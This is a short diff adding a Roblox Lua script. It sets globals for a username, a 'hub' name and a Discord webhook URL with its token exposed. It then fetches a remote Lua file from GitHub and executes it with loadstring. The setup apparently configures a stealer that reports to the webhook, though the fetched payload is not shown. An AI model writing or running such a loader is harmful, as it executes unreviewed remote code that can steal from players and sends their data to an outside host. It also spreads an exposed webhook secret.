@@ -1,0 +1,5 @@
+_G.Username = "GREN444_TNT"
+_G.HubName = "SkyGameing"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1184892839960793099/YfWRyY5fP2TceDJDLruncCo-A6kUhBGkyatR0nJLUZcvv-tcuAlhbj4EAcU2OfrKxifm"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/Peak0Top/main/peak.lua"))()
